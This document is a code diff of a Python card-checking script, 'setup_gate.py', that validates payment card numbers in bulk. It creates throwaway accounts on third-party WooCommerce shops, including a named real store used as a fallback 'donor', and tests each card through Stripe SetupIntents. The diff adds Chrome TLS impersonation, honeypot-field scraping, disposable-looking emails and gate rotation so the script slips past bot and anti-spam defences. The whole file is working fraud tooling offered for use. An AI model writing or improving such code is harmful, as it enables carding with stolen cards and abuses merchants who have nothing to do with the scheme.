@@ -1,4 +1,4 @@
-# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: aiohttp
+# language: Python 3.12+, file: setup_gate.py, target: Windows 11, deps: curl_cffi
 import asyncio
 import json
 import os
@@ -8,14 +8,13 @@ import string
 import sys
 import time
 import uuid
-import aiohttp
+from curl_cffi.requests import AsyncSession
 
 sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 FALLBACK_DONOR = "https://www.blackbeltprotein.com.au"
 
-def rand_str(k=10):
+def rand_str(k=8):
     return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))
 
 def parse_card(raw: str) -> dict:
@@ -35,11 +34,13 @@ def load_ready_gates() -> list[dict]:
                 with open(path, "r", encoding="utf-8") as f:
                     gates = json.load(f)
                     if isinstance(gates, list) and gates:
-                        return [g for g in gates if g.get("pk_live")]
+                        valid = [g for g in gates if g.get("base_url") or g.get("domain")]
+                        if valid:
+                            return valid
             except Exception:
                 pass
     return [{
-        "domain": "blackbeltprotein.com.au",
+        "domain": "www.blackbeltprotein.com.au",
         "base_url": FALLBACK_DONOR,
         "reg_url": f"{FALLBACK_DONOR}/my-account/",
         "add_pm_url": f"{FALLBACK_DONOR}/my-account/add-payment-method/",
@@ -48,7 +49,7 @@ def load_ready_gates() -> list[dict]:
     }]
 
 
-async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw: str) -> dict:
+async def check_card_on_gate(gate_info: dict, s: AsyncSession, card_raw: str) -> dict:
     card = parse_card(card_raw)
     mask = f"{card['number'][:6]}******{card['number'][-4:]}"
     base = gate_info.get("base_url", FALLBACK_DONOR).rstrip("/")
@@ -56,10 +57,12 @@ async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw
     add_pm_url = gate_info.get("add_pm_url", f"{base}/my-account/add-payment-method/")
     ajax_url = gate_info.get("ajax_url", f"{base}/wp-admin/admin-ajax.php")
 
-    # 1. GET /my-account/ to get registration nonce
+    # 1. GET /my-account/ to get registration nonce & form structure
     try:
-        async with s.get(reg_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
-            html = await r.text(errors="replace")
+        r = await s.get(reg_url, timeout=12)
+        if r.status_code != 200:
+            return {"card": card_raw, "status": "ERROR", "detail": f"GET reg HTTP {r.status_code}", "retry_next_gate": True}
+        html = r.text
     except Exception as e:
         return {"card": card_raw, "status": "ERROR", "detail": f"GET reg failed: {e}", "retry_next_gate": True}
 
@@ -68,37 +71,50 @@ async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw
         return {"card": card_raw, "status": "ERROR", "detail": "Closed reg or captcha on /my-account/", "retry_next_gate": True}
     reg_nonce = nonce_m.group(1)
 
+    has_username = 'name="username"' in html
+
     # 2. Register temporary account
-    uname = rand_str(10)
-    email = f"{uname}@mailnesia.com"
-    pwd = f"Sec_{rand_str(8)}!9a"
+    uname = f"usr_{rand_str(8)}"
+    email = f"alex.{rand_str(8)}@gmail.com"
+    pwd = f"Sec_{rand_str(8)}!9aA"
+    
     body = {
-        "username": uname,
         "email": email,
         "password": pwd,
         "woocommerce-register-nonce": reg_nonce,
         "_wp_http_referer": "/my-account/",
         "register": "Register"
     }
+    if has_username:
+        body["username"] = uname
+
+    # Scrape any hidden inputs in registration form for honeypot compatibility
+    reg_form = re.search(r'<form[^>]*class="[^"]*register[^"]*"[^>]*>(.*?)</form>', html, re.S)
+    if reg_form:
+        hidden_inputs = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', reg_form.group(1))
+        for inp in hidden_inputs:
+            nm = re.search(r'name=["\']([^"\']+)["\']', inp)
+            vl = re.search(r'value=["\']([^"\']*)["\']', inp)
+            if nm and vl and nm.group(1) not in body:
+                body[nm.group(1)] = vl.group(1)
+
     post_headers = {
         "Origin": base,
         "Referer": reg_url,
-        "Content-Type": "application/x-www-form-urlencoded"
     }
     try:
-        async with s.post(reg_url, data=body, headers=post_headers, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
-            await r.text(errors="replace")
+        r_reg = await s.post(reg_url, data=body, headers=post_headers, timeout=15)
     except Exception as e:
         return {"card": card_raw, "status": "ERROR", "detail": f"POST reg error: {e}", "retry_next_gate": True}
 
-    cookies = {c.key: c.value for c in s.cookie_jar}
+    cookies = s.cookies.get_dict()
     if not any("wordpress_logged_in" in k for k in cookies):
-        return {"card": card_raw, "status": "ERROR", "detail": "Bot challenge blocked login cookie", "retry_next_gate": True}
+        return {"card": card_raw, "status": "ERROR", "detail": "Bot challenge / anti-spam blocked login cookie", "retry_next_gate": True}
 
     # 3. GET /my-account/add-payment-method/
     try:
-        async with s.get(add_pm_url, ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as r:
-            pm_html = await r.text(errors="replace")
+        r_pm = await s.get(add_pm_url, timeout=12)
+        pm_html = r_pm.text
     except Exception as e:
         return {"card": card_raw, "status": "ERROR", "detail": f"GET add-pm error: {e}", "retry_next_gate": True}
 
@@ -112,7 +128,7 @@ async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw
     legacy_nonce = legacy_m.group(1) if legacy_m else ""
 
     if not pk or (not upe_nonce and not legacy_nonce):
-        return {"card": card_raw, "status": "ERROR", "detail": "PK or SetupIntent nonce missing", "retry_next_gate": True}
+        return {"card": card_raw, "status": "ERROR", "detail": "PK or SetupIntent nonce missing on add-payment-method", "retry_next_gate": True}
 
     # 4. Tokenize via Stripe Elements
     fp = {
@@ -148,9 +164,8 @@ async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw
         "Accept": "application/json"
     }
     try:
-        async with s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers,
-                          ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
-            tok_data = await r.json(content_type=None)
+        r_tok = await s.post("https://api.stripe.com/v1/payment_methods", data=tok_body, headers=tok_headers, timeout=10)
+        tok_data = r_tok.json()
     except Exception as e:
         return {"card": card_raw, "status": "ERROR", "detail": f"Stripe tokenize error: {e}", "retry_next_gate": False}
 
@@ -184,9 +199,8 @@ async def check_card_on_gate(gate_info: dict, s: aiohttp.ClientSession, card_raw
         target_ajax = f"{base}/?wc-ajax=wc_stripe_create_setup_intent"
 
     try:
-        async with s.post(target_ajax, data=conf_body, headers=ajax_headers, ssl=False,
-                          timeout=aiohttp.ClientTimeout(total=15)) as r:
-            conf_resp = await r.json(content_type=None)
+        r_conf = await s.post(target_ajax, data=conf_body, headers=ajax_headers, timeout=15)
+        conf_resp = r_conf.json()
     except Exception as e:
         return {"card": card_raw, "status": "ERROR", "detail": f"SetupIntent confirm network error: {e}", "retry_next_gate": True}
 
@@ -261,6 +275,7 @@ async def main():
 
     print("=" * 80)
     print(f"[*] WOOCOMMERCE STRIPE SETUPINTENT GATE ($0 LIVE ISSUER VALIDATION)")
+    print(f"[*] Engine: curl_cffi Chrome TLS-Impersonation")
     print(f"[*] Active Gate Pool: {len(gates_pool)} donors")
     for idx, g in enumerate(gates_pool[:3], 1):
         print(f"    [{idx}] {g.get('domain', g.get('base_url'))}")
@@ -269,22 +284,14 @@ async def main():
     print(f"[*] Total Cards to Check: {len(cards)}")
     print("=" * 80)
 
-    headers = {
-        "User-Agent": UA,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9"
-    }
-
     results = []
     gate_idx = 0
 
     for i, c in enumerate(cards):
-        # Attempt across available gates with automatic rotation on donor failure
         res = None
         for attempt in range(len(gates_pool)):
             curr_gate = gates_pool[(gate_idx + attempt) % len(gates_pool)]
-            jar = aiohttp.CookieJar(unsafe=True)
-            async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as s:
+            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                 res = await check_card_on_gate(curr_gate, s, c)
                 if not res.get("retry_next_gate"):
                     gate_idx = (gate_idx + attempt) % len(gates_pool)
